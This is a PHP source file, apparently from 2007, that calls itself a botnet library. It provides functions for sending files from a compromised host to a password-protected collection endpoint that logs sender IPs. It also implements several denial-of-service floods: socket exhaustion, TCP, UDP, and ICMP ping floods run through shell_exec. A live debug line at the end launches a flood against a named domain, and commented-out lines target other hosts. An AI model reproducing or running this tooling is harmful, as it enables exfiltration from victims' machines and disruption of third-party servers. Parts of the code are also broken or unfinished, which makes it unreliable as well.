<?php
//PHP Library for Botnets
//<-Harvie 2oo7
//botlib.php v0.1
//////////////////////////////

///Settings/////////////////////////////////////////////////////////
$passwd = "botload";

///Functions////////////////////////////////////////////////////////

////Uploading to server (GET)
//
function botlib_send_plaintext($passwd, $data, $botlib_url) {
  file("$botlib_url?passwd=$passwd?data=".urlencode($data));
}
//
function botlib_send_plaintext_file($passwd, $file, $botlib_url) {
  $data = implode("\n", file($file));
  botlib_send_plaintext($passwd, $data, $botlib_url);
}
//
if(isset($_GET["data"]) && isset($_GET["passwd"])) {
  $msg_file = "./data.txt";
  
  if($_GET["passwd"] != $passwd) die("Error - Incorrect password!");
  $fp = fopen($msg_file, "a");
  $data = "\n\n>> ".$_SERVER["REMOTE_ADDR"]." >>\n".$_GET["data"];
  fwrite($fp, $data);
  fclose($fp);
  die("OK - Sent!");
}

////Uploading to server (POST) - Not Yet!!!!
//
function curl_upload_file($file, $botlib_url) {
  $cmd = "$curl --url $botlib_url";
}
//
if(isset($_POST) && isset($_FILES) && isset($_POST["passwd"])) {
  $dir = "./uploads";
  
  if($_POST["passwd"] != $passwd) die("Error - Incorrect password!</tt>");
  if(!is_dir($dir)) { mkdir($dir); }
  if(is_file($dir.$_FILES['file']['name'])) die("Error - File ".$dir.$_FILES['file']['name']." already exists!</tt>");
  if(!move_uploaded_file($_FILES['file']['tmp_name'], $dir.$_FILES['file']['name'])) { die("Error - Can't move uploaded file!</tt>"); }
  die("OK - Upload successfull!");
}

////(D)DoS Attacks
//
function dos_sock_table($host, $port, $max = 0, $timeout = 0.5) {
  $i = 1;
  while(1) {
    @fclose($sock_array[$i]);
    $sock_array[$i] = @fsockopen($host, $port, $errno, $errstr, $timeout);
    $i++;
    if($i == $max) $i = 1;
  }
}
//
function dos_tcp_flood($host, $port, $timeout = 0.00001) {
  while(1) @fsockopen($host, $port, $errno, $errstr, $timeout);
}
//
function dos_udp_flood($host, $size=1024, $port=0, $char='#') {
  if($port == 0) $port = rand(1,65535);
  $fp = fsockopen("udp://$host", $port);
  if(!$fp) exit(1);
  $data = "";
  for($i=0;$i<$size;$i++) $data = $data.$char; //echo strlen($data); //Debug
  while(1) fwrite($fp, $data);
}
//
function dos_icmp_flood($host, $ttl=255, $unix=false, $root=false) {
  if($unix) {
    if($root) shell_exec("ping -b -Q 255 -f -t $ttl -l 3 -i 0.2 -s 65507 $host");
    else shell_exec("ping -b -f -t $ttl -Q 159 -l 65536 -i 0 -s 65507 $host");
  } else {
    shell_exec("ping -t -i $ttl -v 255 -l 65500 -w 1 $host");
  }
}

///Debuging////////////////////////////////////////////////////////////////
dos_sock_table("djh.cz", 80, 9000);
//dos_tcp_flood("djh.cz", 80);
//dos_sock_table("daemoncze.ath.cx", 80, 3000);
//dos_sock_table("harvie.ath.cx", 80, 3000);
//dos_udp_flood("192.168.2.161");
//dos_icmp_flood("192.168.2.161");
